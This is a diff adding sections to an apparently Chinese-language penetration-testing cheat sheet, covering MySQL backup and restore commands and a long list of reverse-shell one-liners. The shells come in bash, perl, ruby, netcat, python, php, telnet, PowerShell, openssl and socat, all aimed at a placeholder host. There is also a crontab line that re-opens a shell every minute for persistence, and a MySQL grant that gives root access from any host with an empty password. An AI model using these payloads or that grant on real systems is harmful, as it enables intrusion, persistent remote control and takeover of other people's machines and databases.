@@ -66,6 +66,73 @@ ufw status
 ./gost -L=http2://:443 -L=socks5://:1080 -L=ss://aes-128-cfb:123456@:8338	//多端口监听
 nohup ./gost -L=:1080 > /dev/null 2>&1 &	//后台运行不记录日志
 ```
+# mysql
+## mysqldump命令
+```
+mysqldump -uroot -ptecmint rsyslog> rsyslog.sql	//备份单个MySQL数据库
+mysqldump -uroot -ptecmint --databases rsyslog syslog> rsyslog_syslog.sql	//备份多个MySQL数据库
+mysqldump -uroot -ptecmint --all-databases> all-databases.sql	//备份所有数据库
+mysqldump -uroot -ptecmint --no-data rsyslog> rsyslog_structure.sql	//仅备份MySQL数据库结构
+mysqldump -uroot -ptecmint --no-create-db --no-create-info rsyslog> rsyslog_data.sql	//仅备份MySQL数据库数据
+mysqldump -uroot -ptecmint wordpress wp_posts> wordpress_posts.sql	//备份单表数据库
+mysqldump -uroot -ptecmint wordpress wp_posts wp_comments> wordpress_posts_comments.sql	//备份多个数据库表
+mysqldump -uroot -ptecmint -C products> products.sql.tgz	//tar压缩备份
+mysqldump -uroot -ptecmint products | gzip > products.sql.gz	//gzip压缩备份
+mysqldump -uroot -ptecmint products --skip-lock-tables | gzip > products.sql.gz	//gzip压缩备份。如果出现"when using LOCK TABLES",解决办法是加上"--skip-lock-tables"
+mysqldump --opt -u root --password=tecmint -h127.0.0.1 products > D:\products.sql	//--opt代表激活了Mysqldump命令的quick，add-drop-table，add-locks，extended-insert，lock-tables
+mysql -uroot -ptecmint rsyslog <rsyslog.sql	//恢复单个MySQL数据库
+tar xfzO products.sql.tgz | mysql -uroot -ptecmint products	//tar恢复单个MySQL数据库
+gunzip <products.sql.gz | mysql -uroot -ptecmint products	//gunzip恢复单个MySQL数据库
+mysqlimport -uroot -ptecmint rsyslog <rsyslog.sql	//如果要还原目标计算机上已存在的数据库，则需要使用mysqlimport命令
+```
+## mysql主从库查看ip地址
+```
+show slave status	//查看master ip地址
+```
+## mysql命令行外链设置语句
+```
+GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY '' WITH GRANT OPTION;	//MYSQL开启外链语句
+GRANT ALL PRIVILEGES ON *.* TO ‘myuser’@'192.168.1.104′ IDENTIFIED BY ‘admin123′  WITH GRANT OPTION;	//MYSQL设置指定IP外链语句
+```
+# 反弹shell
+```
+BASH REVERSE SHELL|bash -i >& /dev/tcp/x.x.x.x/1337 0>&1
+BASH REVERSE SHELL|0<&196;exec 196<>/dev/tcp/x.x.x.x/1337; sh <&196 >&196 2>&196
+PERL REVERSE SHELL|perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"x.x.x.x:1337");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+PERL REVERSE SHELL WINDOWS|perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"x.x.x.x:1337");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+RUBY REVERSE SHELL|ruby -rsocket -e 'exit if fork;c=TCPSocket.new("x.x.x.x","1337");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+RUBY REVERSE SHELL|ruby -rsocket -e'f=TCPSocket.open("x.x.x.x",1337).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+RUBY REVERSE SHELL WINDOWS|ruby -rsocket -e 'c=TCPSocket.new("x.x.x.x","1337");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+NETCAT REVERSE SHELL|nc -c /bin/sh x.x.x.x 1337
+NETCAT REVERSE SHELL|/bin/sh | nc x.x.x.x 1337
+NETCAT REVERSE SHELL|rm -f /tmp/p; mknod /tmp/p p && nc x.x.x.x 1337 0/tmp/p
+PYTHON REVERSE SHELL|python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+PHP REVERSE SHELL|php -r '$sock=fsockopen("x.x.x.x",1337);exec("/bin/sh -i <&3 >&3 2>&3");'
+TELNET REVERSE SHELL|rm -f /tmp/p; mknod /tmp/p p && telnet x.x.x.x 1337 0/tmp/p
+POWERSHELL REVERSE SHELL|powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("x.x.x.x",1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+## openssl反弹shell
+```
+openssl s_server -quiet -key key.pem -cert cert.pem -port 1337	//本地监听
+mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect x.x.x.x:1337 > /tmp/s; rm /tmp/s	//启动反弹shell
+```
+## crontal写反弹shell
+```
+(crontab -l;printf "* * * * *  /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"x.x.x.x\",53));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n")|crontab -
+```
+## 反弹shell伪终端
+```
+/bin/sh -i
+perl -e 'exec "/bin/sh";'
+python -c 'import pty; pty.spawn("/bin/bash")' 
+```
+使用socat
+```
+#Listener:
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+#Victim:
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444  
+```
 # ipv4的3段私有IP地址
 
 ```
